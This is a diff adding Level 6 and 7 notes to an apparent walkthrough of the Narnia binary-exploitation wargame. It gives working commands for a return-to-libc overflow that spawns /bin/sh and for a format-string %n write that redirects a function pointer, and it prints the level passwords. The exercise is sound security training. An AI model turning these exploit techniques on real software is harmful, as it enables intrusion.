@@ -81,3 +81,24 @@ Level 5: (Format String Attack)
 	- now with the shell open, run 'cat /etc/narnia_pass/narnia6'
 	- Password: BNSjoSDeGL
 
+Level 6:
+	- in ./narnia6 we again take advantage of buffer overflow from strcpy()
+	- all the argv[x] where x>=3 are reset/cleared
+	- argv[1] and argv[2] are strcpy()'d to b1 and b2 respectively (both of size 8)
+	- with b1, we overflow it in such a way that the return address is the address of system() call
+	- this causes system() to be called and at the top of the stack the value will be whatever value was copied from argv[1]
+	- so if we make '/bin/sh;' the first part of argv[1], the shell will open and we can simply cat the password out
+	- run './narnia6 $(python3 -c "import sys;sys.stdout.buffer.write(b'/bin/sh;'+b'\x30\xd4\xdc\xf7')") BBBB'
+	- run 'cat /etc/narnia_pass/narnia7'
+	- Password: 54RtepCEU0
+
+Level 7:
+	- like Level 5 we have to perform a format string attack with snprintf
+	- in vuln() function, ptrf is assigned to the goodfunction(). we want to try reassign it to hackedfunction()
+	- by running './narnia7 <any_val>' we can find the address of both the functions as well as ptrf in the output
+	- convert the address of hackedfunction() to decimal
+	- now we need to write that address to ptrf
+	- run './narnia7 $(python3 -c "import sys;sys.stdout.buffer.write(b'<addr_ptrf>%<addr_hackfunction() (in decimal)-4>x%n')")' (-4 is to account for <addr_ptrf>'s len)
+	- run 'cat /etc/narnia_pass/narnia8'
+	- Password: i1SQ81fkb8
+
